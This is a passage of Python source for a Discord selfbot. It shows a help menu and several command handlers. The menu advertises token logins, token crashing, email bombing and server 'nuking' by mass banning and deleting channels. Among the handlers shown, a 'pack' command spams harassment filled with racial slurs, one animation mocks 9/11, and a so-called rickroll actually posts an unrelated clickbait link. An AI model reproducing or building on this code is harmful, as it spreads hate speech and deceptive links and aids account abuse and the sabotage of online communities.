    for p in proxies:
        file.write((p)+"\n")

@stselfbot.command()
async def uptime(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Uptime]'''+Fore.RESET)
    uptime = datetime.datetime.utcnow() - start_time
    uptime = str(uptime).split('.')[0]
    await ctx.send(f'`'+uptime+'`')

@stselfbot.command()
async def purge(ctx, amount: int): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Purge]'''+Fore.RESET)
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == stselfbot.user).map(lambda m: m):
        try:
           await message.delete()
        except:
            pass

@stselfbot.command(name='group-leaver', aliase=['leaveallgroups', 'leavegroup', 'leavegroups'])
async def _group_leaver(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Groupleaver]'''+Fore.RESET)
    for channel in stselfbot.private_channels:
        if isinstance(channel, discord.GroupChannel):
            await channel.leave()

@stselfbot.command(aliases=['cmds', 'commands'])
async def help(ctx):
    await ctx.message.delete()
    print(f'''

――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――

{Fore.YELLOW}General Commands

{Fore.BLUE}logout {Fore.LIGHTBLACK_EX}- Logs you out the selfbot
{Fore.BLUE}uptime {Fore.LIGHTBLACK_EX}- Shows how long the selfbot has been online and working
{Fore.BLUE}pid {Fore.LIGHTBLACK_EX}- Sends Their ID In The Console
{Fore.BLUE}help {Fore.LIGHTBLACK_EX}- Shows this
{Fore.BLUE}cls {Fore.LIGHTBLACK_EX}- Clears console

――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――

{Fore.YELLOW}Text Stuff

{Fore.BLUE}dm (user) (message) {Fore.LIGHTBLACK_EX}- Sends a message to the specified user
{Fore.BLUE}everyone {Fore.LIGHTBLACK_EX}- Glitched way to mention everyone in a server 
{Fore.BLUE}empty {Fore.LIGHTBLACK_EX}- Sends a empty message
{Fore.BLUE}get-hwid {Fore.LIGHTBLACK_EX}- Prints your hwid in the console
{Fore.BLUE}secret {Fore.LIGHTBLACK_EX}- Returns the message but hidden ||hidden||
{Fore.BLUE}bold {Fore.LIGHTBLACK_EX}- Returns the message but **bold** 
{Fore.BLUE}unflip {Fore.LIGHTBLACK_EX}- Sends: ┬─┬ ノ( ゜-゜ノ)
{Fore.BLUE}tableflip {Fore.LIGHTBLACK_EX}- Sends: (╯°□°）╯︵ ┻━┻
{Fore.BLUE}lenny {Fore.LIGHTBLACK_EX}- Sends: ( ͡° ͜ʖ ͡°)
{Fore.BLUE}shrug {Fore.LIGHTBLACK_EX}- Sends: ¯\_(ツ)_/¯
{Fore.BLUE}reverse {Fore.LIGHTBLACK_EX}- Reverses ur message
{Fore.BLUE}ascii {Fore.LIGHTBLACK_EX}- Makes your message ascii/fancy
{Fore.BLUE}hastebin  {Fore.LIGHTBLACK_EX}- Saves your text/code to hastebin
{Fore.BLUE}abc {Fore.LIGHTBLACK_EX}- Sends the whole abecedary in a single message 
{Fore.BLUE}devowel {Fore.LIGHTBLACK_EX}- Devowels your message
{Fore.BLUE}1337-speak {Fore.LIGHTBLACK_EX}- Translates your message to 1337 language
{Fore.BLUE}spam {Fore.LIGHTBLACK_EX}- Sends the specified message that amount of times
{Fore.BLUE}clear {Fore.LIGHTBLACK_EX}- Spam the chat with invisible messages
{Fore.BLUE}tts {Fore.LIGHTBLACK_EX}- Send that message in .wav format, like an audio
{Fore.BLUE}upper {Fore.LIGHTBLACK_EX}- Make your message CAPS
{Fore.BLUE}encode  {Fore.LIGHTBLACK_EX}- Encode a string to base64 ascii
{Fore.BLUE}decode  {Fore.LIGHTBLACK_EX}- Decode a string from base64 to regular text
{Fore.BLUE}edit {Fore.LIGHTBLACK_EX}- edits all your messages
{Fore.BLUE}textppl {Fore.LIGHTBLACK_EX}- Sends random messages to a channel for example while you're afk
{Fore.BLUE}stoptextppl {Fore.LIGHTBLACK_EX}- Stops textppl

――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――

{Fore.YELLOW}Guild, User Stuff

{Fore.BLUE}first-message {Fore.LIGHTBLACK_EX}- Get the first message in that channel 
{Fore.BLUE}read {Fore.LIGHTBLACK_EX}- Marks all your messages as read, except DM
{Fore.BLUE}group-leaver {Fore.LIGHTBLACK_EX}- Leaves all the groups you're in
{Fore.BLUE}purge {Fore.LIGHTBLACK_EX}- Deletes your messages based on the amount you specify
{Fore.BLUE}genname {Fore.LIGHTBLACK_EX}- Generate a random name based on the server members
{Fore.BLUE}roleinfo {Fore.LIGHTBLACK_EX}- Display some info about the specified role
{Fore.BLUE}guildicon {Fore.LIGHTBLACK_EX}- Display guild icon 
{Fore.BLUE}copy {Fore.LIGHTBLACK_EX}- Copies guild channels, categories, voice channels and makes them in a new one
{Fore.BLUE}role-hexcode {Fore.LIGHTBLACK_EX}- Displays the hexcode of the specified role 
{Fore.BLUE}combine {Fore.LIGHTBLACK_EX}- Combines the two names together
{Fore.BLUE}set-pfp {Fore.LIGHTBLACK_EX}- Set the specified url as profile picture
{Fore.BLUE}av {Fore.LIGHTBLACK_EX}- Shows Your or mentioned users Avatar!
{Fore.BLUE}pfpsteal {Fore.LIGHTBLACK_EX}- Allows you to steal mentioned user profile picture
{Fore.BLUE}revav {Fore.LIGHTBLACK_EX}- Reverse avatar the mentioned user profile picture  
{Fore.BLUE}banner {Fore.LIGHTBLACK_EX}- Shows mentioned users banner
{Fore.BLUE}whois {Fore.LIGHTBLACK_EX}- Displays discord information of the mentioned user 
{Fore.BLUE}blank {Fore.LIGHTBLACK_EX}- Turns your name and profile picture blank
{Fore.BLUE}steal-all-pfp {Fore.LIGHTBLACK_EX}- Steal all the pfps in the server
{Fore.BLUE}fakenet {Fore.LIGHTBLACK_EX}- Allows you to spoof connections in your profile (ie: !fakenet skype st)
{Fore.BLUE}masscon {Fore.LIGHTBLACK_EX}- Add a big amount of connections to your profile (ie: !masscon skype 5 st)
{Fore.BLUE}dump {Fore.LIGHTBLACK_EX}- Dumps avatars of users in a guild into Images folder

――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――

{Fore.YELLOW}Fun Stuff

{Fore.BLUE}lmgtfy {Fore.LIGHTBLACK_EX}- Use lmgtfy search engine to look-up something
{Fore.BLUE}fox {Fore.LIGHTBLACK_EX}- Random fox image
{Fore.BLUE}dog {Fore.LIGHTBLACK_EX}- Random dog image
{Fore.BLUE}cat {Fore.LIGHTBLACK_EX}- Random cat image
{Fore.BLUE}minesweeper {Fore.LIGHTBLACK_EX}- Play minesweeper in the discord chat
{Fore.BLUE}dick {Fore.LIGHTBLACK_EX}- Display the mentioned user dick size
{Fore.BLUE}rainbow {Fore.LIGHTBLACK_EX}- Cycle colors in the role you specify
{Fore.BLUE}8ball {Fore.LIGHTBLACK_EX}- Answers your question
{Fore.BLUE}joke {Fore.LIGHTBLACK_EX}- Drops a random joke in the chat
{Fore.BLUE}slot	 {Fore.LIGHTBLACK_EX}- Play slot machine in the discord chat
{Fore.BLUE}topic {Fore.LIGHTBLACK_EX}- Start a random topic to keep the chat going
{Fore.BLUE}wyr {Fore.LIGHTBLACK_EX}- Start a 'what would you rather' topic in the chat
{Fore.BLUE}ebay-view {Fore.LIGHTBLACK_EX}- Send views to a ebay product
{Fore.BLUE}nitro {Fore.LIGHTBLACK_EX}- Generate a random nitro code
{Fore.BLUE}bitly  {Fore.LIGHTBLACK_EX}- Shorten your link
{Fore.BLUE}cuttly  {Fore.LIGHTBLACK_EX}- Shorten your link
{Fore.BLUE}tinyurl  {Fore.LIGHTBLACK_EX}- Shorten your link 
{Fore.BLUE}weather  {Fore.LIGHTBLACK_EX}- Lookup weather for the specified city
{Fore.BLUE}backup-f (backup) {Fore.LIGHTBLACK_EX}- Backup your friends name and discrim
{Fore.BLUE}auto-bump {Fore.LIGHTBLACK_EX}- Automatically bump server to disboard.org
{Fore.BLUE}advice {Fore.LIGHTBLACK_EX}- gives advice
{Fore.BLUE}junknick {Fore.LIGHTBLACK_EX}- long junk nickname
{Fore.BLUE}pp(User) {Fore.LIGHTBLACK_EX}- Does a funny little pp length command
{Fore.BLUE}rickroll {Fore.LIGHTBLACK_EX}- Sends An Hidden Link Of Rickroll
{Fore.BLUE}pack {Fore.LIGHTBLACK_EX}- Funny message roasts haha
{Fore.BLUE}911 {Fore.LIGHTBLACK_EX}- Funny little animation haha
{Fore.BLUE}cum {Fore.LIGHTBLACK_EX}- Funny emoji man creaming haha
{Fore.BLUE}tweet {Fore.LIGHTBLACK_EX}- Generates a tweet image (specify username and message in command) e. g. !tweet st hi
{Fore.BLUE}get-color {Fore.LIGHTBLACK_EX}- Generates an image of a color that you specify
{Fore.BLUE}oneshot {Fore.LIGHTBLACK_EX}- Sends a line of lyrics one by one of One Shot by King Ferran

――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――

{Fore.YELLOW}Emotions, NSFW Stuff

{Fore.BLUE}feed {Fore.LIGHTBLACK_EX}- Feed the mentioned user
{Fore.BLUE}tickle {Fore.LIGHTBLACK_EX}- Tickle the mentioned user
{Fore.BLUE}slap  {Fore.LIGHTBLACK_EX}- Slap the mentioned user
{Fore.BLUE}hug {Fore.LIGHTBLACK_EX}- Hug the mentioned user
{Fore.BLUE}smug {Fore.LIGHTBLACK_EX}- Smug at the mentioned user
{Fore.BLUE}pat {Fore.LIGHTBLACK_EX}- Pat the mentioned user
{Fore.BLUE}kiss {Fore.LIGHTBLACK_EX}- Kiss the mentioned user

{Fore.RED}NSFW Stuff

{Fore.BLUE}lesbian {Fore.LIGHTBLACK_EX}- Random lesbian [Anime]
{Fore.BLUE}lewdjeko {Fore.LIGHTBLACK_EX}- Random lewd neko [Anime] 
{Fore.BLUE}blowjob {Fore.LIGHTBLACK_EX}- Random blowjob [Anime]
{Fore.BLUE}tits {Fore.LIGHTBLACK_EX}- Random tits [Anime]
{Fore.BLUE}boobs {Fore.LIGHTBLACK_EX}- Random boobs [Anime]
{Fore.BLUE}hentai {Fore.LIGHTBLACK_EX}- Random hentai [Anime]
{Fore.BLUE}feet {Fore.LIGHTBLACK_EX}- Random feet [Anime]
{Fore.BLUE}erofeet {Fore.LIGHTBLACK_EX}- Random erotic feet [Anime]
{Fore.BLUE}anal {Fore.LIGHTBLACK_EX}- Random anal [Anime]
{Fore.BLUE}pussy {Fore.LIGHTBLACK_EX}- Random pussy

――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――

{Fore.YELLOW}Doxxing stuff

{Fore.BLUE}pingweb {Fore.LIGHTBLACK_EX}- Pings a website
{Fore.BLUE}tokeninfo  {Fore.LIGHTBLACK_EX}- Display various information about the token
{Fore.BLUE}tokenfuck  {Fore.LIGHTBLACK_EX}- Crash, glitch screen of a token, all in discord
{Fore.BLUE}geoip  {Fore.LIGHTBLACK_EX}- Display various information about the IP
{Fore.BLUE}gmail-bomb {Fore.LIGHTBLACK_EX}- Spam a gmail
{Fore.BLUE}proxies {Fore.LIGHTBLACK_EX}- Scraps HTTP/HTTPS/SOCKS4/SOCKS5 proxies
{Fore.BLUE}address  {Fore.LIGHTBLACK_EX}- Generates fake address based on the text you specify
{Fore.BLUE}masslogin  {Fore.LIGHTBLACK_EX}- Allows you to mass-login in bot/user tokens
{Fore.BLUE}login  {Fore.LIGHTBLACK_EX}- Logs in with a token
{Fore.BLUE}botlogin  {Fore.LIGHTBLACK_EX}- Logs in with a bot token
{Fore.BLUE}mac  {Fore.LIGHTBLACK_EX}- Lookup a bit of info about a MAC 

――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――

{Fore.YELLOW}Streaming

{Fore.BLUE}btcstream {Fore.LIGHTBLACK_EX}- Stream current btc price
{Fore.BLUE}hypesquad {Fore.LIGHTBLACK_EX}- Allows you to change your hypesquad 
{Fore.BLUE}stream {Fore.LIGHTBLACK_EX}- Stream that message in your profile
{Fore.BLUE}watching {Fore.LIGHTBLACK_EX}- Add a watching status with that message in your profile
{Fore.BLUE}listening {Fore.LIGHTBLACK_EX}-Add a listening status with that message in your profile
{Fore.BLUE}game {Fore.LIGHTBLACK_EX}- Add a game status with that message in your profile
{Fore.BLUE}btc {Fore.LIGHTBLACK_EX}- Display current Bitcoin price
{Fore.BLUE}eth {Fore.LIGHTBLACK_EX}- Display current Ethereum price
{Fore.BLUE}stopactivity {Fore.LIGHTBLACK_EX}- Stops All The Streams, Plays And Listen Activities

――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――

{Fore.YELLOW}Nuking

{Fore.BLUE}dmall  {Fore.LIGHTBLACK_EX}- Messages every user in that guild
{Fore.BLUE}destroy {Fore.LIGHTBLACK_EX}- Ban, delete roles, delete channels, edit guild info, mass create channels All in one!
{Fore.BLUE}massban {Fore.LIGHTBLACK_EX}- Ban all the users in that guild
{Fore.BLUE}masskick {Fore.LIGHTBLACK_EX}- Kick all the users in that guild
{Fore.BLUE}massrole {Fore.LIGHTBLACK_EX}- Mass create role
{Fore.BLUE}masschannel {Fore.LIGHTBLACK_EX}- Mass create channels
{Fore.BLUE}delroles {Fore.LIGHTBLACK_EX}- Delete all the roles
{Fore.BLUE}delchannels {Fore.LIGHTBLACK_EX}- Delete all the channels
{Fore.BLUE}massunban {Fore.LIGHTBLACK_EX}- Unban every member
''')    

@stselfbot.command()
async def stream(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Stream]'''+Fore.RESET)
    stream = discord.Streaming(
        name=message,
        url=stream_url, 
    )
    await stselfbot.change_presence(activity=stream)    

@stselfbot.command()
async def game(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Game]'''+Fore.RESET)
    game = discord.Game(
        name=message
    )
    await stselfbot.change_presence(activity=game)

@stselfbot.command()
async def oneshot(ctx): # b'\xdc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [One Shot]'''+Fore.RESET)
    lyrics = ["lets go",
"come at me",
"its your boy king ferran",
"quit hiding",
"you need wins?",
"i got wins",
"ill carry you any day",
"king ferran in the house",
"ill clap you any day",
"lets go",
"all of yall hidin in a bush bush",
"me im the type that gon push push",
"you see me what we building up",
"walls gonna shield us",
"all of them quit they shush shush",
"nobody competing with this this",
"im really competing with kids kids",
"you missing your shots",
"mine hitting like bops",
"might as well box like a fish",
"fishy",
"feelin like travis its lit its lit",
"you like a banana and split split",
"say so like doja",
"dont need a controller",
"dc like the bat and just quit just quit",
"all on my back is just bling bling",
"the way that i carry my team team",
"im hitting the whip",
"im getting the win",
"you can just crown me the king",
"ey",
"ey",
"ey",
"battle bus get a dub",
"got my squad",
"having fun",
"favorite skin ",
"favorite gun",
"getting rushed",
"building up",
"no more squad one v one",
"missing shots that kid buns",
"this my spot can you not",
"one more tap and ive won",
"he be",
"one shot",
"one shot one shot one shot",
"one shot",
"one shot one shot one shot",
"one shot",
"one shot one shot one shot",
"one shot",
"one shot one shot one shot",
"you bad",
"you dog water",
"you mad",
"you dog water",
"thats sad ",
"you dog water",
"whats that",
"you dog water",
"battle bus get a dub",
"got my squad",
"having fun",
"favorite skin",
"favorite gun",
"getting rushed",
"building up",
"no more squad one v one",
"missing shots that kid buns",
"this my spot can you not",
"one more tap and ive won",
"he be",
"one shot",
"one shot one shot one shot",
"one shot",
"one shot one shot one shot",
"one shot",
"one shot one shot one shot",
"one shot",
"one shot one shot one shot",
"you bad",
"you dog water",
"you mad",
"you dog water",
"thats sad",
"you dog water",
"whats that",
"you dog water",
"i told you i got ez dubs",
"too easy",
"can i get a sheesh?",
"sheeeeeeeeeeesh",
"king ferran out",]
    for i in lyrics:
        await ctx.send(i)
        await asyncio.sleep(2)

    

@stselfbot.command()
async def listening(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Listening]'''+Fore.RESET)
    await stselfbot.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.listening, 
            name=message, 
        ))

@stselfbot.command()
async def watching(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Watching]'''+Fore.RESET)
    await stselfbot.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching, 
            name=message
        ))

@stselfbot.command()
async def pack(ctx):
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Pack]'''+Fore.RESET)
    await ctx.send('You used OBS studio just to screen-record yourself beating the roblox tower of hell obby and you failed on a lava jump trash ass nigga')
    await asyncio.sleep(1)
    await ctx.send('Thats why you had a friend for 3 years on roblox that was a girl and when you asked her out on adopt me she reset and disconnected from the game dumb ass nigga fuck is you talkin bout')
    await asyncio.sleep(1)
    await ctx.send('thats why yo grandma is addicted to masturbating to sea weed water while she sips coffe with syrup in it nasty ass nigga')
    await asyncio.sleep(1)
    await ctx.send('Nigga you literally have a modded version of GTA 5 and whenever you get into arguments with citizens boy ya character just start using shadow clone jutsu without using any hand signs boy you ugly as fuck')
    await asyncio.sleep(1)
    await ctx.send('uhuh nigga ya mother is a level 10 warrior nigga and she trains zobies to clip her toe nails with safety sizzors boy you ugly as fuck')
    await asyncio.sleep(1)
    await ctx.send('nigga you woke up and saw juice wrld and thought he came back from the dead only to find out you got killed by a cross eyed frog the day before you stupid ass nigga')
    await asyncio.sleep(1)
    await ctx.send('What boy you survived a plane crash in south africa and as soon as you got out the plane you just took a 2 hour long shit behind a tree my nigga you ugly as shit')
    await asyncio.sleep(1)
    await ctx.send('nigga but tell me why you the only nigga thats built like a half retarded turanchula boy you got 7 eyes and 4 legs boy')
    await asyncio.sleep(1)
    await ctx.send('i saw you throwing it back for mr krabs you got 3 dabloons and a krabby patty to go hell nah you got sexually harrassed by a math workbook hell nah nigga caught yo dumbass doing the electric zoo with that nigga ed from goodburger because yall found a cockroach nope nigga your grandma got backhanded by angry mall cop over a bottle of listerine and mechanical parts from fortnite nasty neck nigga like shit you got sexually seduced by a radioactive shit spitting cow when you overtalked him with the indian scammer headset')
    await asyncio.sleep(1)
    await ctx.send('“ratio” took you 4 tries to spell it correctly retarded dyslexic ugly lookin peice of banana flavored cheese dirty ass boy, you got shit stains on your forehead my nigga shutcho dumb ass up boi you shoved a boiled egg up your ass at 4am while playing with hot wheels dirty ass boy you eat your fingers for breakfast my nigga shutcho dumb ass up')
    await asyncio.sleep(1)
    await ctx.send('danggg… that shit was ass my nigga shutcho oompa loopa from charlie and the chocolate factory lookin ass boy you started doing fortnite emotes after you got an a on your report card weird ass nigga I hit a 360 on yo grandma in real life and she landed in the gulag dumb ass boy shutcho lame ass up boy they call you “lil inched” at school because your dick is -1 cm long my nigga shut yo dumb ass up boy')
    await asyncio.sleep(1)
    await ctx.send('im sorry.. 💔 but that shit was ass my nigga you down bad too knowing what shreks tits look like anyways shut yo dumb ass up boi you stupid as shit your grandma got instant cancer after taking a gaze at your face for more than 10 seconds and she died a week later stupid ass bitch “Say sum” - :nerd: shutcho “Mom, I’m ready for school!” you stuffed 10 pairs of dildos in your backpack to give to your classmates outside behind the slides dirty nigga shutcho dumb ass up “when pinocchio lies his nose grows” he told you, you got no hoes and nothing happened bitch ass nigga shutcho dumb ass misfigured nose  broken upperlip disabled pony ride lookin ass nigga after lookin at your moms titties I caught ebola shutcho dumb ass up')
    await asyncio.sleep(1)
    await ctx.send('boy shut yo dumb ass up, with your android with a despicable me phone case dirty ass boy you wipe your ass with a pack of toothpaste bitch ass boy you look like a gangster with extra long toothpicks coming outcha ass they call you “Lil Toothy” bitch ass boy I smacked your grandma into a deep state and she turned into a soundcloud rapper you brush your teeth with a ethernet cable nigga I hit you with a slice of sweaty pizza and you started playing geometry dash dumb ass boy if you don’t get your harry potter gacha life mosquito joycon nipple cosplaying as franklin the turtle but emo 🖤 dumb ass boyy cricket wireless using ass boy toaster strudel wireless zoo electric tomato with potato skin lookin ass boy you arabian seastar shut the fuck up blowing some dude in the back of the alley with a fork and knife for 3 nickels and a strawberry poptart fat ass boy I went up to your grandpa with ptsd showed him the new call of duty and he had world war 2 flash backs bitch ass boy')
    await asyncio.sleep(1)
    await ctx.send('you rage when your mom doesn’t let you  eat toaster strudels fat ass boi. you threw a bag of peanut shells at your mom and started rapping cod subtitles stupid ass boi. you got grounded for eating a bag of salt and pepper apple jacks at 3am in the morning outside in the cold listening to lil pump making gacha life music videos bitch ass boi')
    await asyncio.sleep(1)
    await ctx.send('tell me why yo ass built built a rocket league car boy')
    await asyncio.sleep(1)
    await ctx.send('you weird as fuck boy ole ugly ass nigga tell me why yo gang bangin 93 year grandpa caught yo ass fucking a coconut with a rubix cube in yo mouth and grounded you from painting your nails weird ass boy')
    await asyncio.sleep(1)
    await ctx.send('nigga you look like you try to fight tadpoles with yo weird ass boy tell me why i caught yo ugly ass pet frog with a 1737 durag on fucking yo pet snail weird ass boy')
    await asyncio.sleep(1)
    await ctx.send('nigga you bout ugly as shit boy yo head built like donkey kongs right nut ugly ass')
    await asyncio.sleep(1)
    await ctx.send('you can not be talking to me right now nigga you reading all yo packs off your forehead in the mirror boy')
    await asyncio.sleep(1)
    await ctx.send('tell me why yo ass broke yo tv tryna fight squidward weird ass nigga you bout ugly as shit boy with yo un funny ass')
    await asyncio.sleep(1)
    await ctx.send('nigga i caught yo ass counting the pixels on yo tv to say you had 4k nigga.. wait.. no thats 4p headass boy you play gacha life HOOD EDITION and try to act gangster')
    await asyncio.sleep(1)
    await ctx.send('boy i caught yo ass with a sharpened spongebob butter knife robbing a bass pro shop for fishing poles.')
    await asyncio.sleep(1)
    await ctx.send('that shit was ass tell my why i caught you but ass naked solving a rubix cube while fucking a coconut. tell me why i caught you trying to create “super sauce” with your cum combined with sprite')

@stselfbot.command()
async def backup(ctx):
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Backup]'''+Fore.RESET)
    for user in stselfbot.user.friends:
        try:
            with open('Backup\Friends.txt', 'a+') as f:
                f.write(f"{user.name}#{user.discriminator}"+"\n")
        except:
            pass
        
@stselfbot.command(aliases=['markasread', 'ack'])
async def read(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [read]'''+Fore.RESET)
    for guild in stselfbot.guilds:
        await guild.ack()

@stselfbot.command(aliases=["stopstream", "stopplay", "stoplisten"])
async def stopactivity(ctx):
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Stopactivity]'''+Fore.RESET)
    await ctx.message.delete()
    await stselfbot.change_presence(activity=None, status=discord.Status.dnd)

@stselfbot.command()
async def cum(ctx):
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Cum]'''+Fore.RESET)
    message = await ctx.send('''
            :ok_hand:            :smile:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant:''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :smiley:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:  
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :grimacing:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant:  
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :persevere:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:   
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :confounded:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant: 
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :tired_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:    
             ''')
    await asyncio.sleep(0.5)
    await message.edit(contnet='''
                       :ok_hand:            :weary:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:= D:sweat_drops:
             :trumpet:      :eggplant:        
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :dizzy_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D :sweat_drops:
             :trumpet:      :eggplant:                 :sweat_drops:
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :drooling_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D :sweat_drops:
             :trumpet:      :eggplant:                 :sweat_drops:
     ''')

@stselfbot.command(name='911')
async def _f_funny(ctx):
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [911]'''+Fore.RESET)
    abc = f'''👳‍♂️🎅🧔'''
    message = await ctx.send(f'''
:airplane:            :office:           
''')
    await asyncio.sleep(0.3)
    await message.edit(content=f'''
{abc} :airplane:         :office:           
''')
    await asyncio.sleep(2)
    await message.edit(content=f'''
{abc}  :airplane:      :office:           
''')
    await asyncio.sleep(2)
    await message.edit(content=f'''
{abc}   :airplane:   :office:           
''')
    await asyncio.sleep(2)
    await message.edit(content=f'''
{abc}    :airplane::office:           
''')
    await asyncio.sleep(2)
    await message.edit(content=f'''
{abc}    :airplane::office: WATCH YO JET BRRO WATCH U JET
''')
    await asyncio.sleep(2)
    await message.edit(content='''
        :exploding_head::skull::fire::fire_extinguisher::poop:
        ''')

@stselfbot.command()
async def minesweeper(ctx, size: int = 5):
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Minesweeper]'''+Fore.RESET)
    size = max(min(size, 8), 2)
    bombs = [[random.randint(0, size - 1), random.randint(0, size - 1)] for x in range(int(size - 1))]
    is_on_board = lambda x, y: 0 <= x < size and 0 <= y < size
    has_bomb = lambda x, y: [i for i in bombs if i[0] == x and i[1] == y]
    message = "\n"
    for y in range(size):
        for x in range(size):
            tile = "||{}||".format(chr(11036))
            if has_bomb(x, y):
                tile = "||{}||".format(chr(128163))
            else:
                count = 0
                for xmod, ymod in m_offets:
                    if is_on_board(x + xmod, y + ymod) and has_bomb(x + xmod, y + ymod):
                        count += 1
                if count != 0:
                    tile = "||{}||".format(m_numbers[count - 1])
            message += tile
        message += "\n"
    await ctx.send(message)

@stselfbot.command()
async def rickroll(ctx):
	await ctx.message.delete()
	await ctx.send('https://www.tomorrowtides.com/bts-secret-exposed--must-watch.html')

@stselfbot.command()
async def pid(ctx):
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Pid]'''+Fore.RESET)
    print(f'''[K]{Fore.BLUE} {ctx.message.mentions[0]} user id is {ctx.message.mentions[0].id}, copied user id to your keyboard!'''+Fore.RESET)
    pyperclip.copy(f'''{ctx.message.mentions[0].id}''')

@stselfbot.command()
async def pussy(ctx):
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Pussy]'''+Fore.RESET)
    pussy = requests.get('https://nekos.life/api/v2/img/blowjob').json()
    pussyembed = discord.Embed(color=0x56aeec)
    pussyembed_title = pussyembed.title
    pussyembed.set_footer(text=f"cool selfbot")
    pussyembed.set_image(url=pussy["url"])
    try: await ctx.send(embed=pussyembed)
    except:
        await ctx.send(pussy['url'])

@stselfbot.command()
async def reverse(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Reverse]'''+Fore.RESET)
    message = message[::-1]
    await ctx.send(message)

@stselfbot.command()
async def shrug(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Shrug]'''+Fore.RESET)
    shrug = r'¯\_(ツ)_/¯'
    await ctx.send(shrug)

@stselfbot.command()
async def lenny(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Lenny]'''+Fore.RESET)
    lenny = '( ͡° ͜ʖ ͡°)'
    await ctx.send(lenny)

@stselfbot.command()
async def tableflip(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Tableflip]'''+Fore.RESET)
    tableflip = '(╯°□°）╯︵ ┻━┻'
    await ctx.send(tableflip)

@stselfbot.command()
async def unflip(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Unflip]'''+Fore.RESET)
    unflip = '┬─┬ ノ( ゜-゜ノ)'
    await ctx.send(unflip)

@stselfbot.command()
async def bold(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Bold]'''+Fore.RESET)
